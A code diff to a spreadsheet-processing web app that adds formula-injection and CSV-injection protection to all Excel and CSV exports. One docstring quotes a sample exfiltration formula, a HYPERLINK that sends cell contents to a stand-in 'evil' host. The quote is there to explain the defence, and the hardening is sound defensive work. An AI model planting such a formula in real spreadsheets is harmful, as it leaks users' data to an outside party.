@@ -493,6 +493,66 @@ def save_upload(file_storage, path, job_id):
         note['warning'] = (note['warning'] + ' ' + text).strip()
 
 
+def excel_writer(path):
+    """ExcelWriter for output files. xlsxwriter, with text that merely LOOKS like a formula or a link written as
+    plain text: a cell such as =HYPERLINK("http://evil/?"&A2,"x") from an uploaded file must stay text in what we
+    export, never become a live formula (formula injection)."""
+    return pd.ExcelWriter(path, engine='xlsxwriter',
+                          engine_kwargs={'options': {'strings_to_formulas': False, 'strings_to_urls': False}})
+
+
+EXCEL_MAX_ROWS = 1048576
+EXCEL_MAX_COLUMNS = 16384
+
+
+def write_excel(df, path, sheet_name='Sheet1', **kwargs):
+    """Write one DataFrame to a single-sheet xlsx. Same cell types, blanks and header style as pandas' own writer,
+    but written straight through xlsxwriter (about 40% faster on large frames), with formula-like text kept as text."""
+    kwargs.setdefault('index', False)
+    if kwargs != {'index': False}:
+        with excel_writer(path) as writer:      # unusual options: let pandas handle them
+            df.to_excel(writer, sheet_name=sheet_name, **kwargs)
+        return
+    if len(df) + 1 > EXCEL_MAX_ROWS or len(df.columns) > EXCEL_MAX_COLUMNS:
+        raise ValueError(f"This sheet is too large for Excel ({len(df):,} rows x {len(df.columns):,} columns; the "
+                         f"limit is {EXCEL_MAX_ROWS:,} rows x {EXCEL_MAX_COLUMNS:,} columns).")
+    import xlsxwriter
+    workbook = xlsxwriter.Workbook(path, {'strings_to_formulas': False, 'strings_to_urls': False,
+                                          'default_date_format': 'yyyy-mm-dd hh:mm:ss'})
+    try:
+        sheet = workbook.add_worksheet(sheet_name)
+        header = workbook.add_format({'bold': True, 'border': 1, 'align': 'center', 'valign': 'top'})
+        sheet.write_row(0, 0, [str(c) for c in df.columns], header)
+        # blanks (NaN/None/NaT) become None = no cell; infinities were written as the text 'inf' by pandas
+        cells = df.astype(object).where(df.notna(), None)
+        for row_number, row in enumerate(cells.itertuples(index=False, name=None), 1):
+            sheet.write_row(row_number, 0, [('inf' if v == float('inf') else '-inf' if v == float('-inf') else v)
+                                            if isinstance(v, float) else v for v in row])
+    finally:
+        workbook.close()
+
+
+_FORMULA_START = re.compile(r'^[=+\-@\t\r]')
+
+
+def sanitize_csv(df):
+    """Copy of df for CSV export where text starting with = + - @ (or a tab/CR) gets a leading apostrophe so a
+    spreadsheet opening the CSV cannot run it as a formula. Numbers, including negatives, are left alone."""
+    out = df.copy()
+    for col in out.columns:
+        if out[col].dtype == object:
+            def neutralise(value):
+                if isinstance(value, str) and _FORMULA_START.match(value):
+                    try:
+                        float(value)
+                        return value          # a plain number such as -5 or +3.2
+                    except ValueError:
+                        return "'" + value
+                return value
+            out[col] = out[col].map(neutralise)
+    return out
+
+
 def write_data_file(df, file_path, file_format='xlsx', **kwargs):
     """
     Unified file writer that handles Excel and CSV output.
@@ -511,10 +571,10 @@ def write_data_file(df, file_path, file_format='xlsx', **kwargs):
 
     if file_format == 'csv':
         final_path = f"{base_path}.csv"
-        df.to_csv(final_path, index=False, **kwargs)
+        sanitize_csv(df).to_csv(final_path, index=False, **kwargs)
     else:
         final_path = f"{base_path}.xlsx"
-        df.to_excel(final_path, index=False, **kwargs)
+        write_excel(df, final_path, **kwargs)
 
     return final_path
 
@@ -622,7 +682,7 @@ def split_excel_file(input_file_path, output_folder, chunk_size=40000, base_file
         # Send progress update
         send_progress('splitting', i + 1, num_splits, f'Creating {filename}...')
         
-        chunk_df.to_excel(output_path, index=False)
+        write_excel(chunk_df, output_path)
         output_files.append(output_path)
         print(f"Created {filename} with records {start_idx + 1} to {end_idx}")
     
@@ -752,25 +812,14 @@ def generate_test_file():
         file_path = os.path.join(app.config['OUTPUT_FOLDER'], filename)
         
         # Save to Excel with formatting
-        with pd.ExcelWriter(file_path, engine='openpyxl') as writer:
+        with excel_writer(file_path) as writer:
             df.to_excel(writer, sheet_name='Test Data', index=False)
-            
-            # Get the workbook and worksheet for formatting
-            workbook = writer.book
             worksheet = writer.sheets['Test Data']
             
             # Auto-adjust column widths
-            for column in worksheet.columns:
-                max_length = 0
-                column_letter = column[0].column_letter
-                for cell in column:
-                    try:
-                        if len(str(cell.value)) > max_length:
-                            max_length = len(str(cell.value))
-                    except:
-                        pass
-                adjusted_width = min(max_length + 2, 50)
-                worksheet.column_dimensions[column_letter].width = adjusted_width
+            for position, column_name in enumerate(df.columns):
+                longest = max([len(str(column_name))] + [len(str(v)) for v in df[column_name].head(1000).tolist()])
+                worksheet.set_column(position, position, min(longest + 2, 50))
         
         # Schedule cleanup after the response is sent
         @after_this_request
@@ -1969,11 +2018,11 @@ def scrub_file_async(upload_path, columns_to_scrub, relationship_preserve, expor
         
         if filename.endswith('.csv'):
             output_path = job_output_path(session_id, f"{output_filename}.csv")
-            anonymized_df.to_csv(output_path, index=False)
+            sanitize_csv(anonymized_df).to_csv(output_path, index=False)
             download_url = job_download_url(session_id, f"{output_filename}.csv")
         else:
             output_path = job_output_path(session_id, f"{output_filename}.xlsx")
-            anonymized_df.to_excel(output_path, index=False)
+            write_excel(anonymized_df, output_path)
             download_url = job_download_url(session_id, f"{output_filename}.xlsx")
         
         # Read the saved file back and check it too: what the user downloads is what must be anonymous
@@ -2465,7 +2514,7 @@ def find_duplicates_async(upload_path, id_column, duplicate_columns, progress_qu
         output_filename = f"duplicates_{timestamp}"
         output_path = job_output_path(session_id, f"{output_filename}.xlsx")
         
-        with pd.ExcelWriter(output_path, engine='openpyxl') as writer:
+        with excel_writer(output_path) as writer:
             # Sheet 1: Duplicate summary
             results_df.to_excel(writer, sheet_name='Duplicates', index=False)
             
@@ -3040,7 +3089,7 @@ def find_unique_identifier_async(upload_path, selected_columns, progress_queue, 
         send_progress('saving', 60, 100, 'Generating Excel data file...', 88)
         excel_path = job_output_path(session_id, f"{output_basename}_data.xlsx")
 
-        with pd.ExcelWriter(excel_path, engine='openpyxl') as writer:
+        with excel_writer(excel_path) as writer:
             # Sheet 1: Data with Unique IDs
             df.to_excel(writer, sheet_name='Data with Unique IDs', index=False)
 
@@ -3383,7 +3432,7 @@ def merge_files_async(left_file_path, right_file_path, left_key, right_key, join
         output_filename = f"merged_{timestamp}"
         output_path = job_output_path(session_id, f"{output_filename}.xlsx")
         
-        with pd.ExcelWriter(output_path, engine='openpyxl') as writer:
+        with excel_writer(output_path) as writer:
             merged_df.to_excel(writer, sheet_name='Merged Data', index=False)
             summary_df.to_excel(writer, sheet_name='Join Summary', index=False)
         
@@ -3719,7 +3768,7 @@ def compare_files_async(file1_path, file2_path, key_columns, compare_columns, pr
         output_filename = f"comparison_{timestamp}"
         output_path = job_output_path(session_id, f"{output_filename}.xlsx")
         
-        with pd.ExcelWriter(output_path, engine='openpyxl') as writer:
+        with excel_writer(output_path) as writer:
             summary_df.to_excel(writer, sheet_name='Summary', index=False)
             if len(added_df) > 0:
                 added_df.to_excel(writer, sheet_name='Added Rows', index=False)
@@ -4086,7 +4135,7 @@ def generate_pivot_async(file_path, rows, columns, values, aggfunc, filters, pro
         output_path = job_output_path(session_id, f"{output_filename}.xlsx")
         
         # Write to Excel with error handling
-        with pd.ExcelWriter(output_path, engine='openpyxl') as writer:
+        with excel_writer(output_path) as writer:
             # Write pivot table with proper structure
             try:
                 # Verify columns are not MultiIndex before writing
@@ -4609,7 +4658,7 @@ def validate_data_async(file_path, validation_rules, progress_queue, session_id)
         output_filename = f"validation_{timestamp}"
         output_path = job_output_path(session_id, f"{output_filename}.xlsx")
         
-        with pd.ExcelWriter(output_path, engine='openpyxl') as writer:
+        with excel_writer(output_path) as writer:
             summary_df.to_excel(writer, sheet_name='Validation Summary', index=False)
             errors_df.to_excel(writer, sheet_name='Error Details', index=False)
             if len(invalid_df) > 0:
@@ -4983,7 +5032,7 @@ def normalize_columns_async(file_path, column_types, trim_whitespace, progress_q
         output_filename = f"normalized_{timestamp}"
         output_path = job_output_path(session_id, f"{output_filename}.xlsx")
         
-        with pd.ExcelWriter(output_path, engine='openpyxl') as writer:
+        with excel_writer(output_path) as writer:
             normalized_df.to_excel(writer, sheet_name='Normalized Data', index=False)
             
             # Create summary sheet
@@ -5445,46 +5494,17 @@ def compare_columns_async(file1_path, file2_path, file1_name, file2_name, progre
         output_filename = f"column_comparison_{timestamp}"
         output_path = job_output_path(session_id, f"{output_filename}.xlsx")
         
-        # Just write the data - formatting can slow things down significantly
-        with pd.ExcelWriter(output_path, engine='openpyxl') as writer:
+        with excel_writer(output_path) as writer:
             comparison_df.to_excel(writer, sheet_name='Column Comparison', index=False)
             
-            # Optional: Basic formatting (only if there are few columns, skip if many)
-            if len(comparison_df) <= 500:  # Only format if reasonable number of rows
-                try:
-                    from openpyxl.styles import PatternFill, Font
-                    ws = writer.sheets['Column Comparison']
-                    
-                    # Green fill for checkmarks, red for X marks
-                    green_fill = PatternFill(start_color='90EE90', end_color='90EE90', fill_type='solid')
-                    red_fill = PatternFill(start_color='FFB6C1', end_color='FFB6C1', fill_type='solid')
-                    green_font = Font(bold=True, color='006400')
-                    red_font = Font(bold=True, color='8B0000')
-                    
-                    # Format cells
-                    for row_idx in range(len(comparison_df)):
-                        excel_row = row_idx + 2  # +2 because Excel is 1-indexed and we skip header row
-                        
-                        # Check File 1 column (column B, index 2)
-                        cell_b = ws.cell(row=excel_row, column=2)
-                        if cell_b.value == 'Yes':
-                            cell_b.fill = green_fill
-                            cell_b.font = green_font
-                        elif cell_b.value == 'No':
-                            cell_b.fill = red_fill
-                            cell_b.font = red_font
-                        
-                        # Check File 2 column (column C, index 3)
-                        cell_c = ws.cell(row=excel_row, column=3)
-                        if cell_c.value == 'Yes':
-                            cell_c.fill = green_fill
-                            cell_c.font = green_font
-                        elif cell_c.value == 'No':
-                            cell_c.fill = red_fill
-                            cell_c.font = red_font
-                except Exception as format_error:
-                    # If formatting fails, just continue without it - data is still saved
-                    print(f"Warning: Formatting failed, but file saved: {format_error}")
+            # Green for Yes, red for No in the two file columns (conditional formats: no per-cell work, any size)
+            worksheet = writer.sheets['Column Comparison']
+            green = writer.book.add_format({'bg_color': '#90EE90', 'font_color': '#006400', 'bold': True})
+            red = writer.book.add_format({'bg_color': '#FFB6C1', 'font_color': '#8B0000', 'bold': True})
+            if len(comparison_df):
+                last_row = len(comparison_df)
+                worksheet.conditional_format(1, 1, last_row, 2, {'type': 'cell', 'criteria': '==', 'value': '"Yes"', 'format': green})
+                worksheet.conditional_format(1, 1, last_row, 2, {'type': 'cell', 'criteria': '==', 'value': '"No"', 'format': red})
         
         download_url = job_download_url(session_id, f"{output_filename}.xlsx")
         
@@ -5649,7 +5669,7 @@ def transpose_file_async(upload_path, progress_queue, session_id):
         output_filename = f"transposed_{timestamp}"
         output_path = job_output_path(session_id, f"{output_filename}.xlsx")
         
-        with pd.ExcelWriter(output_path, engine='openpyxl') as writer:
+        with excel_writer(output_path) as writer:
             transposed_df.to_excel(writer, sheet_name='Transposed Data', index=False)
         
         download_url = job_download_url(session_id, f"{output_filename}.xlsx")
@@ -5874,7 +5894,7 @@ def row_filter():
         base_name = os.path.splitext(filename)[0]
         output_filename = f"{base_name}_filtered_{session_id}.xlsx"
         output_path = job_output_path(session_id, output_filename)
-        filtered_df.to_excel(output_path, index=False)
+        write_excel(filtered_df, output_path)
 
         # Cache the result
         cache_session_file(session_id, output_filename, output_path, matching_rows, len(filtered_df.columns), 'Row Filter')
@@ -6024,7 +6044,7 @@ def find_replace():
         base_name = os.path.splitext(filename)[0]
         output_filename = f"{base_name}_replaced_{session_id}.xlsx"
         output_path = job_output_path(session_id, output_filename)
-        df.to_excel(output_path, index=False)
+        write_excel(df, output_path)
 
         # Cache the result
         cache_session_file(session_id, output_filename, output_path, len(df), len(df.columns), 'Find & Replace')
@@ -6131,7 +6151,7 @@ def calculated_columns():
         base_name = os.path.splitext(filename)[0]
         output_filename = f"{base_name}_calculated_{session_id}.xlsx"
         output_path = job_output_path(session_id, output_filename)
-        df.to_excel(output_path, index=False)
+        write_excel(df, output_path)
 
         # Cache the result
         cache_session_file(session_id, output_filename, output_path, len(df), len(df.columns), 'Calculated Columns')
@@ -6371,7 +6391,7 @@ def column_operations():
         base_name = os.path.splitext(filename)[0]
         output_filename = f"{base_name}_modified_{session_id}.xlsx"
         output_path = job_output_path(session_id, output_filename)
-        df.to_excel(output_path, index=False)
+        write_excel(df, output_path)
 
         # Cache the result
         cache_session_file(session_id, output_filename, output_path, len(df), len(df.columns), 'Column Operations')
@@ -7060,7 +7080,7 @@ def pipeline_execute(session_id):
 
                 # Save transformed data
                 excel_path = job_output_path(session_id, f"{output_basename}_data.xlsx")
-                result_df.to_excel(excel_path, index=False)
+                write_excel(result_df, excel_path)
 
                 # Create ZIP package
                 send_progress(90, 'Packaging results...')
